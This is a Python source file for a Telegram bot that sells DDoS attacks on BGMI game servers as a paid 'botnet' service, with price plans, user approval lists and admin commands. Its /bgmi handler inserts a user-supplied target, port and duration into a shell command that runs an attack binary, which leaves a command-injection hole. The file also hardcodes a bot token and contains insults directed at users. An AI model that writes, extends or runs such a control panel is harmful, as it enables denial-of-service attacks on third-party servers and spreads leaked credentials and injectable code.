#script by @RAJOWNER90

import telebot
import subprocess
import datetime
import os

from keep_alive import keep_alive
keep_alive()
# insert your Telegram bot token here
bot = telebot.TeleBot('7140094105:AAEcteoZXkxDKcv97XhGhkC-wokOUW-2a6k')

# Admin user IDs
admin_id = ["1662672529"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["1549748318"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "❌ 𝗟𝗢𝗚𝗦 𝗔𝗟𝗥𝗘𝗗𝗬 𝗖𝗟𝗘𝗔𝗥𝗘𝗗. 𝗡𝗢 𝗗𝗔𝗧𝗔 𝗙𝗢𝗨𝗡𝗗."
            else:
                file.truncate(0)
                response = "𝗟𝗢𝗚𝗦 𝗖𝗟𝗘𝗔𝗥𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✅"
    except FileNotFoundError:
        response = "𝗡𝗢 𝗟𝗢𝗚𝗦 𝗙𝗢𝗨𝗡𝗗 𝗧𝗢 𝗖𝗟𝗘𝗔𝗥."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"🆄🆂🅴🆁 🅸🅳: {user_id} | 🆃🅸🅼🅴: {datetime.datetime.now()} | 🅲🅾🅼🅼🅰🅽🅳🆂: {command}"
    if target:
        log_entry += f" | 🅣🅐🅡🅖🅔🅣: {target}"
    if port:
        log_entry += f" | 🅟🅞🅡🅣: {port}"
    if time:
        log_entry += f" | 🅓🅤🅡🅐🅣🅞🅘🅝: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗗𝗨𝗥𝗔𝗧𝗢𝗜𝗡 𝗙𝗢𝗥𝗠𝗔𝗧. 𝗨𝗦𝗘 𝗣𝗢𝗦𝗜𝗧𝗜𝗩𝗘 𝗜𝗡𝗧𝗘𝗚𝗘𝗥 :> 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"🆄🆂🅴🆁 {user_to_add} 🅰🅳🅳🅴🅳 🆂🆄🅲🅲🅴🆂🅵🆄🅻🅻🆈 {duration} {time_unit}. 𝗘𝗫𝗣𝗜𝗥𝗘 𝗢𝗡 {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "❌ 𝗙𝗔𝗜𝗟𝗗 𝗧𝗢 𝗦𝗘𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟 𝗘𝗫𝗣𝗜𝗥𝗬 𝗗𝗔𝗧𝗘."
            else:
                response = "𝗨𝗦𝗘𝗥 𝗔𝗟𝗥𝗘𝗗𝗬 𝗘𝗫𝗜𝗦𝗧 😂."
        else:
            response = "✅ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗣𝗘𝗖𝗜𝗙𝗬 𝗔 𝗨𝗦𝗘𝗥 𝗜𝗗 𝗔𝗡𝗗 𝗗𝗨𝗥𝗔𝗧𝗢𝗜𝗡 :>  (e.g., 1hour, 2days, 3weeks, 4months) ."
    else:
        response = "❌ 𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘𝗗 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗧𝗢 𝗢𝗪𝗡𝗘𝗥:- @RAJOWNER90."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 𝗬𝗢𝗨𝗥 𝗜𝗡𝗙𝗢:\n\n🆔 𝗨𝗦𝗘𝗥 𝗜𝗗: <code>{user_id}</code>\n📝 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: {username}\n🔖 𝗥𝗢𝗟𝗘: {user_role}\n📅 𝗘𝗫𝗣𝗜𝗥𝗘 𝗢𝗡: {user_approval_expiry.get(user_id, '𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗')}\n⏳ 𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"🆄🆂🅴🆁 {user_to_remove} 🆁🅴🅼🅾🆅🅴🅳 🆂🆄🅲🅲🅴🆂🆂🅵🆄🅻🅻🆈 👍."
            else:
                response = f"𝗨𝗦𝗘𝗥 {user_to_remove} 𝗡𝗢 𝗗𝗔𝗧𝗔 𝗙𝗢𝗨𝗡𝗗 𝗜𝗡 𝗧𝗛𝗘 𝗟𝗜𝗦𝗧."
        else:
            response = '''𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗣𝗘𝗖𝗜𝗙𝗬 𝗔 𝗨𝗦𝗘𝗥 𝗜𝗗 𝗥𝗘𝗠𝗢𝗩𝗘. 
✅ 𝗨𝗦𝗔𝗚𝗘: /remove <𝗨𝗦𝗘𝗥 𝗜𝗗>'''
    else:
        response = "❌ 𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘𝗗 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗧𝗢 𝗢𝗪𝗡𝗘𝗥:- @RAJOWNER90 🙇."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "❌ 𝗟𝗢𝗚𝗦 𝗔𝗥𝗘 𝗔𝗟𝗥𝗘𝗗𝗬 𝗖𝗟𝗘𝗔𝗥𝗘𝗗. 𝗡𝗢 𝗗𝗔𝗧𝗔 𝗙𝗢𝗨𝗡𝗗."
                else:
                    file.truncate(0)
                    response = "𝗟𝗢𝗚𝗦 𝗖𝗟𝗘𝗔𝗥𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✅"
        except FileNotFoundError:
            response = "𝗟𝗢𝗚𝗦 𝗔𝗥𝗘 𝗔𝗟𝗥𝗘𝗗𝗬 𝗖𝗟𝗘𝗔𝗥𝗗 ❌."
    else:
        response = "❌ 𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘𝗗 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗧𝗢 𝗢𝗪𝗡𝗘𝗥 :- @RAJOWNER90 ❄."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝗨𝗦𝗘𝗥 𝗔𝗥𝗘 𝗔𝗟𝗥𝗘𝗗𝗬 𝗖𝗟𝗘𝗔𝗥𝗘𝗗.𝗡𝗢 𝗗𝗔𝗧𝗔 𝗙𝗢𝗨𝗡𝗗 ❌."
                else:
                    file.truncate(0)
                    response = "𝗨𝗦𝗘𝗥𝗦 𝗖𝗟𝗘𝗔𝗥𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✅"
        except FileNotFoundError:
            response = "𝗨𝗦𝗘𝗥𝗦 𝗔𝗥𝗘 𝗔𝗟𝗥𝗘𝗗𝗬 𝗖𝗟𝗘𝗔𝗥𝗗 ❌."
    else:
        response = "𝗔𝗕𝗘 𝗟𝗔𝗨𝗗𝗘 𝗣𝗔𝗛𝗟𝗘 𝗕𝗨𝗬 𝗞𝗔𝗥 𝗟𝗘 (⸝⸝⸝⁼̴́◡⁼̴̀⸝⸝⸝) 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗧𝗢 𝗢𝗪𝗡𝗘𝗥:- @RAJOWNER90 🙇."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝗡𝗢 𝗗𝗔𝗧𝗔 𝗙𝗢𝗨𝗡𝗗 ❌"
        except FileNotFoundError:
            response = "𝗡𝗢 𝗗𝗔𝗧𝗔 𝗙𝗢𝗨𝗡𝗗 ❌"
    else:
        response = "𝗔𝗕𝗘 𝗟𝗔𝗨𝗗𝗘 𝗣𝗔𝗛𝗟𝗘 𝗕𝗨𝗬 𝗞𝗔𝗥 𝗟𝗘 (⸝⸝⸝⁼̴́◡⁼̴̀⸝⸝⸝) 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗧𝗢 𝗢𝗪𝗡𝗘𝗥:- @RAJOWNER90 ❄."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝗡𝗢 𝗗𝗔𝗧𝗔 𝗙𝗢𝗨𝗡𝗗 ❌."
                bot.reply_to(message, response)
        else:
            response = "𝗡𝗢 𝗗𝗔𝗧𝗔 𝗙𝗢𝗨𝗡𝗗 ❌"
            bot.reply_to(message, response)
    else:
        response = "𝗔𝗕𝗘 𝗟𝗔𝗨𝗗𝗘 𝗣𝗔𝗛𝗟𝗘 𝗕𝗨𝗬 𝗞𝗔𝗥 𝗟𝗘 (⸝⸝⸝⁼̴́◡⁼̴̀⸝⸝⸝) 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗧𝗢 𝗢𝗪𝗡𝗘𝗥:- @RAJOWNER90 ❄."
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 🅰🆃🆃🅰🅲🅺 🆂🆃🅰🆁🆃🅴🅳 \n\n🅣🅐🅡🅖🅔🅣: {target}\n🅟🅞🅡🅣: {port}\n🅓🅤🅡🅐🅣🅞🅘🅝: {time} 🅢🅔🅒🅞🅝🅓🅢\n𝗝𝗢𝗜𝗡 :-https://t.me/+sUHNz0xm_205MTBl"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝗪𝗔𝗜𝗧 𝗙𝗢𝗥 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 ❌. 𝗕𝗘𝗙𝗢𝗥𝗘 𝗥𝗨𝗡 𝗧𝗛𝗘 /bgmi 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗔𝗚𝗔𝗜𝗡."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 241:
                response = "Error: Time interval must be less than 120."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)#𝓰𝓸𝓭𝔁𝓬𝓱𝓮𝓪𝓽𝓼 𝓪𝓵𝓸𝓷𝓮𝓫𝓸𝔂
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 800"
                process = subprocess.run(full_command, shell=True)
                response = f"🅰🆃🆃🅰🅲🅺 🅵🅸🅽🅸🆂🅷🅴🅳: {target} 🅟🅞🅡🅣: {port} 🅓🅤🅡🅐🅣🅞🅘🅝: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ 𝗨𝗦𝗔𝗚𝗘 :- /bgmi <𝗧𝗔𝗥𝗚𝗘𝗧> <𝗣𝗢𝗥𝗧> <𝗗𝗨𝗥𝗔𝗧𝗢𝗜𝗡>"  # Updated command syntax
    else:
        response = ("🤬 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 \n\n𝗬𝗢𝗨 𝗗𝗢𝗡'𝗧 𝗛𝗔𝗩𝗘 𝗣𝗘𝗥𝗠𝗜𝗦𝗦𝗜𝗢𝗡 𝗧𝗢 𝗨𝗦𝗘 /bgmi 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗧𝗢 𝗢𝗪𝗡𝗘𝗥:- @RAJOWNER90")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ 𝗡𝗢 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗟𝗢𝗚𝗦 𝗚𝗢𝗨𝗡𝗗 𝗙𝗢𝗥 𝗬𝗢𝗨."
        except FileNotFoundError:
            response = "𝗡𝗢 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 𝗟𝗢𝗚𝗦 𝗙𝗢𝗨𝗡𝗗."
    else:
        response = "𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗧𝗢 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 🖕."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /bgmi : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.
💥 /myinfo : TO Check Your WHOLE INFO.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Buy From :- @RAJOWNER90
Official Channel :- https://t.me/+sUHNz0xm_205MTBl
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🆆🅴🅻🅲🅾🅼🅴 🆃🅾 🅿🆁🅴🅼🅸🆄🅼 🅳🅳🅾🆂 , {user_name}! .
🤖𝗧𝗥𝗬 𝗧𝗢 𝗥𝗨𝗡 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 : /help 
✅𝗢𝗪𝗡𝗘𝗥 :- @RAJOWNER90'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝗙𝗢𝗟𝗢𝗪 𝗧𝗛𝗘 𝗥𝗨𝗟𝗘 ⚠️:

 ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
 ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
 ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
 ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
 ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
 ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
 ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):#𝓪𝓵𝓸𝓷𝓮𝓫𝓸𝔂 𝓮𝓭𝓲𝓽.𝓫𝔂 𝓰𝓸𝓭𝔁𝓬𝓱𝓮𝓪𝓽𝓼
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 300 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 5

Pr-ice List💸 :
Day-->80 Rs
Week-->400 Rs
Month-->1000 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)
#𝓪𝓵𝓸𝓷𝓮𝓫𝓸𝔂 𝓮𝓭𝓲𝓽


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


